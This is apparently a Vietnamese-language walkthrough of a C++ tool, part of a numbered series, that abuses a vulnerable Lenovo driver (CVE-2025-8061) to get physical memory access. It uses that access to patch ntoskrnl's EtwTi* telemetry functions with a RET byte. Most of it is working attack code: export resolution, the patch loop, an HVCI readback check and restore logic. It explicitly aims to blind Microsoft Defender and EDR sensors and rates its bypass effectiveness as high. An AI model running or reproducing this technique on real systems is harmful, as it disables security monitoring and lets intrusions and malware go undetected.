# 08 — ETW-TI Patch (Event Tracing for Windows — Threat Intelligence)

**File:** `08_etw_patch.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Physical read/write (1 byte) + Kernel VA read  
**Output:** Patch `EtwTi*` functions với `0xC3` (RET), blind ETW telemetry

---

## Mục tiêu

Patch các function `EtwTi*` trong ntoskrnl.exe bằng `0xC3` (x64 RET instruction). Những function này là nguồn telemetry cho Microsoft Defender, ETW-based EDR sensors, và Process Monitor. Sau khi patch: các events không còn được emit.

---

## Lý thuyết nền

### ETW-TI là gì?

`ETW` (Event Tracing for Windows) là logging infrastructure của Windows kernel. `ETW-TI` (Threat Intelligence) là một tập các provider đặc biệt trong ntoskrnl mà Microsoft Defender và các security product khác subscribe để nhận events về:

| Function | Events |
|----------|--------|
| `EtwTiLogReadWriteVm` | Process VM read/write (injection detection) |
| `EtwTiLogAllocFreeVm` | VirtualAlloc/Free trong process khác (shellcode injection) |
| `EtwTiLogMapUnmapView` | MapViewOfSection events (mapping-based injection) |
| `EtwTiLogCreateUserThread` | CreateRemoteThread detection |
| `EtwTiLogProtectExec` | VirtualProtect đổi vùng thành executable |
| `EtwTiLogDriverLoad` | Driver load events |

### Kỹ thuật patch: ghi 0xC3 = RET

`0xC3` là opcode của `RET` instruction (x64 near return). Nếu ta ghi byte này vào byte đầu tiên của function, function sẽ return ngay lập tức mà không làm gì → event không được emit.

Đây là **.text patching** — ghi vào code section. Đây là lý do technique này **riskier** hơn các technique data-only:
- HVCI (Hypervisor-Protected Code Integrity) protect .text pages với EPT → write bị discard silently
- PatchGuard có thể detect thay đổi trong .text trên một số build

### Tìm các EtwTi* function

Những function này được export từ ntoskrnl. Ta dùng Export Directory của ntoskrnl để resolve VA của từng function, sau đó `VaToPa` để lấy PA rồi ghi.

---

## Giải thích code từng dòng

### PatchEntry struct

```cpp
struct PatchEntry {
    const char *name;      // tên function
    uint64_t    func_va;   // kernel VA
    uint64_t    func_pa;   // physical address của byte đầu tiên
    uint8_t     orig_byte; // byte gốc (để restore)
    bool        patched;   // đã patch thành công?
};
static PatchEntry g_patches[8];
static int        g_patch_count = 0;
```

Lưu state để restore.

### Danh sách targets

```cpp
static const char *s_etw_targets[] = {
    "EtwTiLogReadWriteVm",
    "EtwTiLogAllocFreeVm",
    "EtwTiLogMapUnmapView",
    "EtwTiLogCreateUserThread",
    "EtwTiLogProtectExec",
    "EtwTiLogDriverLoad",
    nullptr
};
```

### GetNtExport() — resolve export qua Export Directory

```cpp
static uint64_t GetNtExport(uint64_t cr3, uint64_t ntos_base, const char *name)
{
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, ntos_base, hdrbuf, sizeof(hdrbuf));  // đọc PE header

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    auto *nt  = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);

    // DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] = Export directory
    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    DWORD expSize = (dir.Size < 0x80000u) ? dir.Size : 0x80000u;
    
    // Alloc buffer và đọc toàn bộ export section
    auto *expbuf = (uint8_t*)VirtualAlloc(nullptr, expSize + 0x1000, ...);
    KernelRead(cr3, ntos_base + dir.VirtualAddress, expbuf, expSize);
    
    auto *exp = (IMAGE_EXPORT_DIRECTORY*)expbuf;
    DWORD base_rva = dir.VirtualAddress;  // base để tính offsets trong expbuf
```

Kỹ thuật: ta đọc toàn bộ export section vào user buffer, sau đó parse locally. Điều này avoid nhiều `KernelRead` calls nhỏ.

```cpp
    for (DWORD i = 0; i < exp->NumberOfNames && !result; i++) {
        // AddressOfNames là array of RVA to name strings
        DWORD offN = exp->AddressOfNames - base_rva + i * 4;
        DWORD nameRva = *(DWORD*)(expbuf + offN);
        DWORD nameOff = nameRva - base_rva;
        
        if (_stricmp((char*)(expbuf + nameOff), name) != 0) continue;
        // Tên match!
        
        // Lấy ordinal từ AddressOfNameOrdinals
        DWORD offO = exp->AddressOfNameOrdinals - base_rva + i * 2;
        WORD ord = *(WORD*)(expbuf + offO);
        
        // Dùng ordinal để index AddressOfFunctions
        DWORD offF = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
        DWORD funcRva = *(DWORD*)(expbuf + offF);
        result = ntos_base + funcRva;  // kernel VA = base + RVA
```

### HVCI Detection

```cpp
// Sau khi patch tất cả functions, check xem có write nào stick không
int stuck = 0;
for (int i = 0; i < g_patch_count; i++) {
    if (g_patches[i].patched) stuck++;
}

if (stuck == 0 && g_patch_count > 0) {
    printf("[!] HVCI DETECTED: zero writes stuck. Physical writes to .text\n");
    printf("    are silently discarded by the hypervisor's EPT.\n");
    printf("    This technique does NOT work with HVCI enabled.\n");
}
```

Nếu ta ghi 0xC3 vào 6 functions nhưng readback tất cả vẫn là byte gốc → HVCI discard hết → detect.

### Patch loop

```cpp
for (int t = 0; s_etw_targets[t]; t++) {
    PatchEntry &pe = g_patches[g_patch_count];
    pe.name = s_etw_targets[t];
    
    // Resolve VA
    pe.func_va = GetNtExport(cr3, nt.base, pe.name);
    if (!pe.func_va) {
        printf("    [-] %s not found\n", pe.name);
        continue;
    }
    
    // Lấy PA
    pe.func_pa = VaToPa(cr3, pe.func_va);
    if (!pe.func_pa) continue;
    
    // Đọc byte gốc
    pe.orig_byte = 0xFF;
    uint8_t rb[1]; PhysRead(pe.func_pa, rb, 1);
    pe.orig_byte = rb[0];
    
    // Ghi 0xC3 (RET)
    PhysWriteU8(pe.func_pa, 0xC3);
    
    // Readback verify
    uint8_t rb2[1]; PhysRead(pe.func_pa, rb2, 1);
    pe.patched = (rb2[0] == 0xC3);
    
    printf("    %s: orig=0x%02X → 0xC3 %s\n",
           pe.name, pe.orig_byte,
           pe.patched ? "[OK]" : "[FAILED - HVCI?]");
    
    if (pe.patched) g_patch_count++;
}
```

### RestoreAll()

```cpp
static void RestoreAll(uint64_t cr3)
{
    printf("[*] Restoring all patched bytes...\n");
    int restored = 0;
    for (int i = 0; i < g_patch_count; i++) {
        if (!g_patches[i].patched) continue;
        
        // Re-resolve PA (page table có thể đã thay đổi nếu đã lâu)
        uint64_t pa = VaToPa(cr3, g_patches[i].func_va);
        if (!pa) pa = g_patches[i].func_pa;  // fallback
        
        if (PhysWriteU8(pa, g_patches[i].orig_byte)) {
            printf("    Restored %s (0x%02X)\n", g_patches[i].name, g_patches[i].orig_byte);
            restored++;
        }
    }
    printf("[+] %d/%d functions restored\n", restored, g_patch_count);
}
```

### User interaction với countdown

```cpp
printf("[*] Press Enter to RESTORE all patched bytes and exit...\n");
printf("    WARNING: PatchGuard MAY detect .text modifications.\n");
printf("    Do not leave patches active for extended periods.\n");
getchar();
// User nhấn Enter → restore ngay
```

Khác với 05_dse_bypass.cpp (countdown cố định 5s), ở đây user kiểm soát khi nào restore vì đây là demo patching, không phải short-window operation như DSE.

---

## Risk Assessment

### PatchGuard risk

PatchGuard verify code integrity của kernel modules theo timer ngẫu nhiên. Patch .text bytes của ntoskrnl có thể bị detect → BSOD 0x109. Tuy nhiên:
- `EtwTi*` functions không phải trong protected set của PG trên tất cả builds
- Một số build Win11 22H2-26100 không detect việc patch các function nhỏ này
- Nếu function chỉ là `0xC3` + epilogue, signature match vẫn có thể pass

**Không có gì đảm bảo** — đây là technique có nguy cơ BSOD.

### HVCI risk

Nếu HVCI bật: write bị discard → technique vô hiệu. Code detect và báo cáo.

---

## Stability Summary

| Vấn đề | Mức độ |
|--------|--------|
| **PatchGuard** | **RISKY** — có thể detect .text patch, BSOD 0x109 |
| **HVCI** | **BLOCKED** — write bị discard, detect bằng readback |
| BSOD nếu function bị patch giữa chừng | Low — 1-byte write là atomic |
| EDR bypass effectiveness | High — major telemetry source bị tắt |

---

## Tóm tắt flow

```
GetSystemCR3() → cr3
GetNtoskrnlInfo(cr3) → nt.base, .text/.data bounds

For each EtwTi* function:
    GetNtExport(cr3, nt.base, name) → func_va
    VaToPa(cr3, func_va) → func_pa
    PhysRead(func_pa, 1 byte) → orig_byte (save!)
    PhysWriteU8(func_pa, 0xC3)
    PhysRead verify → patched? or HVCI blocked?

[*] Press Enter...

RestoreAll():
    For each patched function:
        PhysWriteU8(func_pa, orig_byte)
```
